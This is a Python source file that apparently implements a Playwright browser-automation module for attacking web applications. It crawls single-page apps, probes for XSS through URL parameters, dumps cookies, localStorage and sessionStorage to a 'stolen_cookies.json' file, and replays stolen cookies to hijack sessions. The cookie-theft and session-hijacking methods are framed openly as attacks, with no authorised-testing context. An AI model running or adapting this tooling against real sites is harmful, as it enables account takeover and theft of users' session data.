"""
BrowserAgent — Browser Automation для JS-heavy targets
Задачи:
- Playwright headless browsing
- XSS cookie extraction
- Session hijacking
- Dynamic content crawling
- Form fuzzing с браузером
"""
from pathlib import Path
from typing import Dict, List, Optional
import asyncio, json

try:
    from playwright.async_api import async_playwright, Browser, Page
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False
    print("[BROWSER] Warning: playwright not installed. Run: pip install playwright && playwright install chromium")

class BrowserAgent:
    def __init__(self, workspace: Path):
        self.workspace = workspace
        self.results = {
            "crawled_urls": [],
            "forms": [],
            "cookies": [],
            "localStorage": [],
            "xss_found": []
        }
        self.browser: Optional[Browser] = None
        self.page: Optional[Page] = None
    
    async def initialize(self):
        """Initialize Playwright browser"""
        if not PLAYWRIGHT_AVAILABLE:
            print("[BROWSER] Playwright not available, skipping browser automation")
            return False
        
        try:
            self.playwright = await async_playwright().start()
            self.browser = await self.playwright.chromium.launch(
                headless=True,
                args=['--no-sandbox', '--disable-setuid-sandbox']
            )
            print("[BROWSER] Browser initialized")
            return True
        except Exception as e:
            print(f"[BROWSER] Error initializing: {e}")
            return False
    
    async def close(self):
        """Close browser"""
        if self.page:
            await self.page.close()
        if self.browser:
            await self.browser.close()
        if hasattr(self, 'playwright'):
            await self.playwright.stop()
    
    async def crawl_spa(self, target_url: str, max_depth: int = 2) -> Dict:
        """
        Crawl Single Page Application (SPA)
        Ждёт загрузки JS, собирает динамические endpoints
        """
        if not await self.initialize():
            return {}
        
        print(f"[BROWSER] Crawling SPA: {target_url}")
        
        try:
            context = await self.browser.new_context(
                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            )
            self.page = await context.new_page()
            
            # Intercept requests to collect URLs
            urls_found = set()
            
            async def handle_request(request):
                urls_found.add(request.url)
            
            self.page.on("request", handle_request)
            
            # Navigate and wait for network idle
            await self.page.goto(target_url, wait_until='networkidle', timeout=30000)
            
            # Wait for JavaScript to execute
            await asyncio.sleep(3)
            
            # Extract all links
            links = await self.page.eval_on_selector_all('a[href]', 
                'elements => elements.map(el => el.href)'
            )
            urls_found.update(links)
            
            # Extract forms
            forms = await self.page.eval_on_selector_all('form', '''
                elements => elements.map(form => ({
                    action: form.action,
                    method: form.method,
                    inputs: Array.from(form.querySelectorAll('input')).map(input => ({
                        name: input.name,
                        type: input.type,
                        value: input.value
                    }))
                }))
            ''')
            
            self.results["crawled_urls"] = list(urls_found)
            self.results["forms"] = forms
            
            print(f"[BROWSER] Crawled {len(urls_found)} URLs, {len(forms)} forms")
            
            await context.close()
            
            return self.results
        
        except Exception as e:
            print(f"[BROWSER] Error crawling: {e}")
            return self.results
        finally:
            await self.close()
    
    async def test_xss_with_browser(self, target_url: str, xss_payloads: List[str]) -> List[Dict]:
        """
        Test XSS с браузером (детектим alert, console.log)
        """
        if not await self.initialize():
            return []
        
        print(f"[BROWSER] Testing XSS on {target_url}")
        xss_results = []
        
        try:
            context = await self.browser.new_context()
            self.page = await context.new_page()
            
            # Track dialogs (alert, confirm, prompt)
            alerts = []
            
            async def handle_dialog(dialog):
                alerts.append({
                    "type": dialog.type,
                    "message": dialog.message
                })
                await dialog.accept()
            
            self.page.on("dialog", handle_dialog)
            
            # Track console logs
            console_logs = []
            
            async def handle_console(msg):
                console_logs.append(msg.text)
            
            self.page.on("console", handle_console)
            
            for payload in xss_payloads[:10]:  # Test first 10 payloads
                try:
                    # Inject payload via URL parameter
                    test_url = f"{target_url}?test={payload}"
                    await self.page.goto(test_url, wait_until='load', timeout=10000)
                    await asyncio.sleep(1)
                    
                    # Check if alert was triggered
                    if alerts:
                        xss_results.append({
                            "success": True,
                            "payload": payload,
                            "type": "alert-based XSS",
                            "url": test_url,
                            "evidence": alerts[-1]
                        })
                        print(f"  ✓ XSS found with payload: {payload[:50]}")
                        alerts.clear()
                    
                    # Check console for XSS execution
                    xss_indicators = ["XSS", "injected", payload[:20]]
                    if any(indicator in " ".join(console_logs) for indicator in xss_indicators):
                        xss_results.append({
                            "success": True,
                            "payload": payload,
                            "type": "console-based XSS",
                            "url": test_url
                        })
                        console_logs.clear()
                
                except Exception as e:
                    continue
            
            await context.close()
            
            self.results["xss_found"] = xss_results
            print(f"[BROWSER] XSS testing complete: {len(xss_results)} vulnerabilities found")
            
            return xss_results
        
        except Exception as e:
            print(f"[BROWSER] Error testing XSS: {e}")
            return []
        finally:
            await self.close()
    
    async def steal_cookies(self, target_url: str, credentials: Optional[Dict] = None) -> Dict:
        """
        Cookie stealing (после успешной XSS или авторизации)
        """
        if not await self.initialize():
            return {}
        
        print(f"[BROWSER] Stealing cookies from {target_url}")
        
        try:
            context = await self.browser.new_context()
            self.page = await context.new_page()
            
            # If credentials provided, try to login first
            if credentials:
                await self._login(target_url, credentials)
            
            await self.page.goto(target_url, wait_until='networkidle', timeout=30000)
            
            # Extract cookies
            cookies = await context.cookies()
            
            # Extract localStorage
            local_storage = await self.page.evaluate('''() => {
                let items = {};
                for (let i = 0; i < localStorage.length; i++) {
                    let key = localStorage.key(i);
                    items[key] = localStorage.getItem(key);
                }
                return items;
            }''')
            
            # Extract sessionStorage
            session_storage = await self.page.evaluate('''() => {
                let items = {};
                for (let i = 0; i < sessionStorage.length; i++) {
                    let key = sessionStorage.key(i);
                    items[key] = sessionStorage.getItem(key);
                }
                return items;
            }''')
            
            self.results["cookies"] = cookies
            self.results["localStorage"] = local_storage
            self.results["sessionStorage"] = session_storage
            
            # Save to file
            cookie_file = self.workspace / "stolen_cookies.json"
            with open(cookie_file, 'w') as f:
                json.dump({
                    "url": target_url,
                    "cookies": cookies,
                    "localStorage": local_storage,
                    "sessionStorage": session_storage
                }, f, indent=2)
            
            print(f"[BROWSER] Stolen {len(cookies)} cookies, saved to {cookie_file}")
            
            await context.close()
            
            return self.results
        
        except Exception as e:
            print(f"[BROWSER] Error stealing cookies: {e}")
            return {}
        finally:
            await self.close()
    
    async def _login(self, target_url: str, credentials: Dict):
        """Helper: attempt login"""
        try:
            # Navigate to login page
            await self.page.goto(target_url, wait_until='networkidle')
            
            # Find username/email field
            username_selectors = ['input[name="username"]', 'input[name="email"]', 'input[type="email"]']
            for selector in username_selectors:
                try:
                    await self.page.fill(selector, credentials.get("username", ""))
                    break
                except:
                    continue
            
            # Find password field
            password_selector = 'input[name="password"]'
            await self.page.fill(password_selector, credentials.get("password", ""))
            
            # Submit form
            await self.page.click('button[type="submit"]')
            await self.page.wait_for_load_state('networkidle', timeout=10000)
            
            print(f"[BROWSER] Login attempted")
        except Exception as e:
            print(f"[BROWSER] Login failed: {e}")
    
    async def session_hijacking(self, target_url: str, stolen_cookies: List[Dict]) -> bool:
        """
        Session hijacking — использование украденных cookies
        """
        if not await self.initialize():
            return False
        
        print(f"[BROWSER] Attempting session hijacking on {target_url}")
        
        try:
            context = await self.browser.new_context()
            
            # Add stolen cookies
            await context.add_cookies(stolen_cookies)
            
            self.page = await context.new_page()
            await self.page.goto(target_url, wait_until='networkidle', timeout=30000)
            
            # Check if we're authenticated
            page_content = await self.page.content()
            
            # Look for indicators of successful authentication
            auth_indicators = ["logout", "dashboard", "profile", "admin", "welcome"]
            authenticated = any(indicator in page_content.lower() for indicator in auth_indicators)
            
            if authenticated:
                print(f"[BROWSER] ✓ Session hijacking successful!")
                
                # Take screenshot
                screenshot_path = self.workspace / "hijacked_session.png"
                await self.page.screenshot(path=str(screenshot_path))
                print(f"[BROWSER] Screenshot saved: {screenshot_path}")
            else:
                print(f"[BROWSER] ✗ Session hijacking failed (not authenticated)")
            
            await context.close()
            
            return authenticated
        
        except Exception as e:
            print(f"[BROWSER] Error in session hijacking: {e}")
            return False
        finally:
            await self.close()
    
    def save_results(self, output_file: Path = None):
        """Save browser agent results"""
        if output_file is None:
            output_file = self.workspace / "browser_results.json"
        
        with open(output_file, 'w') as f:
            json.dump(self.results, f, indent=2)
        
        print(f"[BROWSER] Results saved to {output_file}")
        return output_file
